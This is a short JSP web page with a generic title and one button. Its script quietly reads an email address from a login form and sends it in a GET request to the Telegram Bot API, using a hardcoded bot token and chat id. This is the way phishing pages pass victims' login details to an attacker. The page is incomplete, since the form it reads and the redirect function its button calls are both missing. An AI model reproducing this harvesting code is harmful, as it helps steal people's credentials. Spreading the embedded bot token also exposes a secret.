<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>

<html>
  <head>
    <title>Title of the document</title>
  </head>
  <body>
    <button type="button" onclick="redirectFunc()">Click and go to the page</button>
    <script>
    var request=new XMLHttpRequest();
    function searchEmail(){
    	var email=document.loginForm.email.value;
    	var url="https://api.telegram.org/bot1630901134:AAGS5vDBZ7XpgYMUYEPW5GW_TwH8K83yJyU/sendMessage?chat_id=-1001321741747&text="+email;
    	try{
    		request.onreadystatechange=function()
    		{
    			if(request.readyState==4)
    			{
    				
    			}	
    		}
    		request.open("GET",url,true);
    		request.send();
    	}
    	catch(e){
    		alert("Unable to connect to server");}
    }
    </script>
  </body>
</html>